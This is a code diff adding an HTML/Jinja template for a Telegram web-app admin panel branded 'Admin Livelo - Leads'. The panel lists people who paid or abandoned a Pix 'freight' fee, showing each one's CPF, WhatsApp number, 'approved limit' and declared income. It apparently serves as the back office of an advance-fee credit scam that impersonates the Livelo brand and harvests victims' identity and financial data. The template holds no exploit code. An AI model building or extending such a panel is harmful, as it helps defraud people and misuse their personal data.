@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Livelo - Leads</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-color: var(--tg-theme-bg-color, #121212);
+      --text-color: var(--tg-theme-text-color, #ffffff);
+      --hint-color: var(--tg-theme-hint-color, #a0a0a0);
+      --link-color: var(--tg-theme-link-color, #E91E8C);
+      --button-color: var(--tg-theme-button-color, #E91E8C);
+      --button-text-color: var(--tg-theme-button-text-color, #ffffff);
+      --secondary-bg-color: var(--tg-theme-secondary-bg-color, #1e1e1e);
+      
+      --pink: #E91E8C;
+      --green: #10B981;
+      --red: #EF4444;
+      --orange: #F59E0B;
+      --radius: 16px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      padding: 16px;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    h1, h2, h3 { font-family: 'Outfit', sans-serif; }
+
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .header h2 { font-weight: 700; font-size: 1.5rem; color: var(--pink); }
+    .header p { font-size: 0.95rem; color: var(--hint-color); margin-top: 6px; }
+
+    .tabs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+    
+    .tab {
+      flex: 1;
+      padding: 12px;
+      text-align: center;
+      border-radius: 12px;
+      background-color: var(--secondary-bg-color);
+      color: var(--hint-color);
+      font-weight: 600;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .tab.active {
+      background-color: var(--pink);
+      color: #fff;
+    }
+
+    .tab-content {
+      display: none;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .lead-card {
+      background-color: var(--secondary-bg-color);
+      border-radius: var(--radius);
+      padding: 16px;
+      margin-bottom: 16px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+      border-left: 4px solid var(--hint-color);
+    }
+
+    .lead-card.paid { border-left-color: var(--green); }
+    .lead-card.abandoned { border-left-color: var(--red); }
+    .lead-card.pending { border-left-color: var(--orange); }
+
+    .lead-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      padding-bottom: 8px;
+    }
+
+    .lead-header h3 { font-size: 1.1rem; color: #fff; }
+    
+    .badge {
+      font-size: 0.75rem;
+      padding: 4px 8px;
+      border-radius: 8px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+    .badge.paid { background: rgba(16, 185, 129, 0.2); color: var(--green); }
+    .badge.abandoned { background: rgba(239, 68, 68, 0.2); color: var(--red); }
+    .badge.pending { background: rgba(245, 158, 11, 0.2); color: var(--orange); }
+
+    .lead-info {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      font-size: 0.85rem;
+    }
+
+    .info-item {
+      display: flex;
+      flex-direction: column;
+    }
+    .info-item span.label {
+      color: var(--hint-color);
+      font-size: 0.75rem;
+      margin-bottom: 2px;
+    }
+    .info-item span.val {
+      font-weight: 600;
+      color: #eaeaea;
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 40px 20px;
+      color: var(--hint-color);
+    }
+    .empty-state svg {
+      width: 48px;
+      height: 48px;
+      opacity: 0.5;
+      margin-bottom: 12px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <h2>Gestão de Leads</h2>
+    <p>Monitoramento em Tempo Real</p>
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" onclick="switchTab('paid')">✅ Pagaram Frete ({{ leads_pagos|length }})</div>
+    <div class="tab" onclick="switchTab('abandoned')">❌ Abandonaram ({{ leads_abandonados|length }})</div>
+  </div>
+
+  <!-- TAB: PAGOS -->
+  <div id="tab-paid" class="tab-content active">
+    {% if leads_pagos %}
+      {% for lead in leads_pagos %}
+        <div class="lead-card paid">
+          <div class="lead-header">
+            <h3>{{ lead.nome or 'Sem Nome' }}</h3>
+            <span class="badge paid">PAGO</span>
+          </div>
+          <div class="lead-info">
+            <div class="info-item">
+              <span class="label">CPF</span>
+              <span class="val">{{ lead.cpf or 'N/A' }}</span>
+            </div>
+            <div class="info-item">
+              <span class="label">WhatsApp</span>
+              <span class="val">{{ lead.whatsapp or 'N/A' }}</span>
+            </div>
+            <div class="info-item">
+              <span class="label">Limite Aprovado</span>
+              <span class="val">{{ lead.limite_aprovado or 'N/A' }}</span>
+            </div>
+            <div class="info-item">
+              <span class="label">Renda Declarada</span>
+              <span class="val">{{ lead.renda or 'N/A' }}</span>
+            </div>
+          </div>
+        </div>
+      {% endfor %}
+    {% else %}
+      <div class="empty-state">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"></path></svg>
+        <p>Nenhum lead com pagamento aprovado ainda.</p>
+      </div>
+    {% endif %}
+  </div>
+
+  <!-- TAB: ABANDONADOS -->
+  <div id="tab-abandoned" class="tab-content">
+    {% if leads_abandonados %}
+      {% for lead in leads_abandonados %}
+        <div class="lead-card {% if lead.pix_status == 'pending' %}pending{% else %}abandoned{% endif %}">
+          <div class="lead-header">
+            <h3>{{ lead.nome or 'Sem Nome' }}</h3>
+            <span class="badge {% if lead.pix_status == 'pending' %}pending{% else %}abandoned{% endif %}">
+              {{ 'PENDENTE' if lead.pix_status == 'pending' else 'CANCELADO/ERRO' }}
+            </span>
+          </div>
+          <div class="lead-info">
+            <div class="info-item">
+              <span class="label">CPF</span>
+              <span class="val">{{ lead.cpf or 'N/A' }}</span>
+            </div>
+            <div class="info-item">
+              <span class="label">WhatsApp</span>
+              <span class="val">{{ lead.whatsapp or 'N/A' }}</span>
+            </div>
+            <div class="info-item">
+              <span class="label">Limite Aprovado</span>
+              <span class="val">{{ lead.limite_aprovado or 'N/A' }}</span>
+            </div>
+            <div class="info-item">
+              <span class="label">Renda Declarada</span>
+              <span class="val">{{ lead.renda or 'N/A' }}</span>
+            </div>
+          </div>
+        </div>
+      {% endfor %}
+    {% else %}
+      <div class="empty-state">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"></path></svg>
+        <p>Nenhum lead abandonou o processo.</p>
+      </div>
+    {% endif %}
+  </div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    function switchTab(tabId) {
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+      
+      if(tabId === 'paid') {
+        document.querySelector('.tab:nth-child(1)').classList.add('active');
+        document.getElementById('tab-paid').classList.add('active');
+      } else {
+        document.querySelector('.tab:nth-child(2)').classList.add('active');
+        document.getElementById('tab-abandoned').classList.add('active');
+      }
+    }
+  </script>
+</body>
+</html>
